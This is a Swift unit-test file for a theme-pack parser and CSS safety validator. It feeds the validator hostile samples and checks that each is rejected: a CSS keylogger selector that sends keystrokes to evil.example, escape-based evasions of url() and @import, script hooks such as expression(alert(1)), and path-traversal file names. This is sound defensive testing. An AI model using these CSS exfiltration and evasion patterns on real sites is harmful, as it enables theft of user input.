import CryptoKit
import XCTest
@testable import GridCore

final class SiteThemePackTests: XCTestCase {
    static var repoThemes: URL {
        URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("site-themes", isDirectory: true)
    }

    /// The packs GRID ships, as the app loads them.
    static func shippedPacks() -> [SiteThemePack] {
        let dir = repoThemes.appendingPathComponent("packs")
        let names = (try? FileManager.default.contentsOfDirectory(atPath: dir.path)) ?? []
        return names.filter { $0.hasSuffix(".css") }.sorted().compactMap {
            try? SiteThemePack.parse(String(contentsOf: dir.appendingPathComponent($0), encoding: .utf8))
        }
    }

    static func shippedEntries() -> [SiteThemeEntry] { shippedPacks().map(\.entry) }

    private let header = """
    /* grid-site-theme
    id: demo
    name: Demo Site
    version: 2
    hosts: demo.example, *.demo.org
    paths: /, /search
    description: A test pack.
    */

    """

    // MARK: Shipped packs

    func testEveryShippedPackParsesAndIsListedWithItsDigest() throws {
        let dir = Self.repoThemes.appendingPathComponent("packs")
        let files = try FileManager.default.contentsOfDirectory(atPath: dir.path).filter { $0.hasSuffix(".css") }.sorted()
        XCTAssertFalse(files.isEmpty)
        let index = try SiteThemeIndex.parse(Data(contentsOf: Self.repoThemes.appendingPathComponent("index.json")))
        XCTAssertEqual(index.packs.map(\.file).sorted(), files, "run scripts/site-themes-index.sh")
        for f in files {
            let data = try Data(contentsOf: dir.appendingPathComponent(f))
            let pack = try XCTUnwrap(try? SiteThemePack.parse(String(decoding: data, as: UTF8.self)), "\(f) doesn't parse")
            let item = try XCTUnwrap(index.packs.first { $0.file == f })
            XCTAssertEqual(item.id, pack.id, f)
            XCTAssertEqual(item.version, pack.version, "\(f): bump the version and rerun scripts/site-themes-index.sh")
            XCTAssertEqual(item.sha256, SHA256.hash(data: data).map { String(format: "%02x", $0) }.joined(), "\(f) changed: rerun scripts/site-themes-index.sh")
            XCTAssertTrue(pack.css.contains("html[data-grid-theme=\"\(pack.id)\"]"), "\(f): scope rules to the pack's id")
        }
    }

    // MARK: Parsing

    func testParseHeader() throws {
        let p = try SiteThemePack.parse(header + "html[data-grid-theme=\"demo\"] body { color: red }")
        XCTAssertEqual(p.id, "demo")
        XCTAssertEqual(p.entry.name, "Demo Site")
        XCTAssertEqual(p.version, 2)
        XCTAssertEqual(p.entry.hosts, ["demo.example", "*.demo.org"])
        XCTAssertEqual(p.entry.paths, ["/", "/search"])
        XCTAssertEqual(p.description, "A test pack.")
        XCTAssertTrue(p.entry.matches(URL(string: "https://a.demo.org/search")!))
        XCTAssertFalse(p.entry.matches(URL(string: "https://demo.example/other")!))
    }

    func testRejectsBadHeaders() {
        func err(_ s: String) -> SiteThemePack.ParseError? { (try? SiteThemePack.parse(s)) == nil ? (Result { try SiteThemePack.parse(s) }.failure) : nil }
        XCTAssertEqual(err("body { color: red }"), .noHeader)
        XCTAssertEqual(err("/* some comment */ body {}"), .noHeader)
        XCTAssertEqual(err(header.replacingOccurrences(of: "id: demo", with: "id: Bad_ID")), .invalid("id"))
        XCTAssertEqual(err(header.replacingOccurrences(of: "version: 2", with: "version: two")), .invalid("version"))
        XCTAssertEqual(err(header.replacingOccurrences(of: "hosts: demo.example, *.demo.org", with: "hosts: localhost")), .invalid("hosts"))
        XCTAssertEqual(err(header.replacingOccurrences(of: "hosts: demo.example, *.demo.org", with: "hosts: evil.com/path")), .invalid("hosts"))
        XCTAssertEqual(err(header.replacingOccurrences(of: "paths: /, /search", with: "paths: search")), .invalid("paths"))
        XCTAssertEqual(err(header.replacingOccurrences(of: "name: Demo Site\n", with: "")), .missing("name"))
        XCTAssertEqual(err(header + String(repeating: "a", count: SiteThemePack.maxBytes)), .tooLarge)
    }

    // MARK: CSS safety

    func testSafeCSSPasses() {
        XCTAssertEqual(SiteThemeCSS.violations("""
        html[data-grid-theme="x"] body { background: linear-gradient(var(--grid-bg0), var(--grid-bg1)); }
        html[data-grid-theme="x"] .logo { background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'/>"); }
        @media (max-width: 600px) { html[data-grid-theme="x"] .b { display: none } }
        @keyframes scan { from { opacity: 0 } to { opacity: 1 } }
        """), [])
        // Deliberately strict: even a string that merely contains "url(" is refused.
        XCTAssertEqual(SiteThemeCSS.violations(#"a::after { content: "url(" }"#), ["url()"])
    }

    func testRemoteLoadsAreRejected() {
        XCTAssertEqual(SiteThemeCSS.violations("a { background: url(https://evil.example/x.png) }"), ["url()"])
        XCTAssertEqual(SiteThemeCSS.violations("a { background: url( 'http://evil.example/x' ) }"), ["url()"])
        XCTAssertEqual(SiteThemeCSS.violations("@import 'https://evil.example/x.css';"), ["@import"])
        XCTAssertEqual(SiteThemeCSS.violations("a { background: image-set('x.png' 1x) }"), ["image-set()"])
        XCTAssertEqual(SiteThemeCSS.violations("@font-face { font-family: x; src: url(//evil.example/f.woff) }"), ["url()"])
        // The CSS keylogger shape.
        XCTAssertEqual(SiteThemeCSS.violations(#"input[value$="a"] { background: url("https://evil.example/?k=a") }"#), ["url()"])
    }

    func testEscapesAndCommentsDontHideAnything() {
        XCTAssertEqual(SiteThemeCSS.violations(#"a { background: u\72l(https://evil.example) }"#), ["url()"])
        XCTAssertEqual(SiteThemeCSS.violations(#"a { background: u\000072 l(https://evil.example) }"#).isEmpty, false)
        XCTAssertEqual(SiteThemeCSS.violations("a { background: u/**/rl(https://evil.example) }").isEmpty, true,
                       "a comment inside the name makes it not a function at all")
        XCTAssertEqual(SiteThemeCSS.violations(#"@\69mport "x.css";"#), ["@import"])
    }

    func testScriptHooksAreRejected() {
        XCTAssertEqual(SiteThemeCSS.violations("a { width: expression(alert(1)) }"), ["expression()"])
        XCTAssertEqual(SiteThemeCSS.violations("a { -moz-binding: url(x) }"), ["-moz-binding", "url()"])
        XCTAssertEqual(SiteThemeCSS.violations("a { behavior: url(x.htc) }"), ["behavior", "url()"])
        XCTAssertTrue(SiteThemeCSS.violations("a { scroll-behavior: smooth }").isEmpty)
    }

    func testUnsafePackIsRejected() {
        XCTAssertThrowsError(try SiteThemePack.parse(header + "a { background: url(https://x.example) }")) {
            XCTAssertEqual($0 as? SiteThemePack.ParseError, .unsafeCSS(["url()"]))
        }
    }

    // MARK: Index and merging

    func testIndexParse() throws {
        let json = """
        {"format": 1, "packs": [
          {"id": "youtube", "version": 3, "file": "youtube.css", "sha256": "\(String(repeating: "a", count: 64))", "minimumApp": "1.1.0"},
          {"id": "../evil", "version": 1, "file": "x.css", "sha256": "\(String(repeating: "b", count: 64))"},
          {"id": "bad-file", "version": 1, "file": "../x.css", "sha256": "\(String(repeating: "b", count: 64))"},
          {"id": "short-sha", "version": 1, "file": "s.css", "sha256": "abc"},
          {"id": "youtube", "version": 4, "file": "youtube.css", "sha256": "\(String(repeating: "c", count: 64))"}
        ]}
        """
        let index = try SiteThemeIndex.parse(Data(json.utf8))
        XCTAssertEqual(index.packs.map(\.id), ["youtube"])
        XCTAssertEqual(index.packs[0].minimumApp, "1.1.0")
        XCTAssertThrowsError(try SiteThemeIndex.parse(Data(#"{"format": 2, "packs": []}"#.utf8)))
        XCTAssertThrowsError(try SiteThemeIndex.parse(Data("<html>".utf8)))
    }

    func testMergePrefersUserThenNewerDownload() throws {
        func pack(_ id: String, _ v: Int, _ name: String = "N") -> SiteThemePack {
            SiteThemePack(entry: SiteThemeEntry(id: id, name: name, hosts: ["\(id).example"]), version: v, css: "")
        }
        let merged = SiteThemeResolver.merge(builtIn: [pack("a", 2), pack("b", 2), pack("c", 1)],
                                             downloaded: [pack("a", 3), pack("b", 1), pack("d", 1)],
                                             user: [pack("c", 1, "Mine")])
        func source(_ id: String) -> SiteThemeResolver.Source? { merged.first { $0.pack.id == id }?.source }
        XCTAssertEqual(source("a"), .downloaded)   // newer download wins
        XCTAssertEqual(source("b"), .builtIn)      // older download ignored
        XCTAssertEqual(source("c"), .user)         // the user's own always wins
        XCTAssertEqual(source("d"), .downloaded)   // a new site from the repository
        XCTAssertEqual(merged.count, 4)
    }
}

private extension Result where Failure == Error {
    var failure: SiteThemePack.ParseError? { if case .failure(let e) = self { return e as? SiteThemePack.ParseError }; return nil }
}
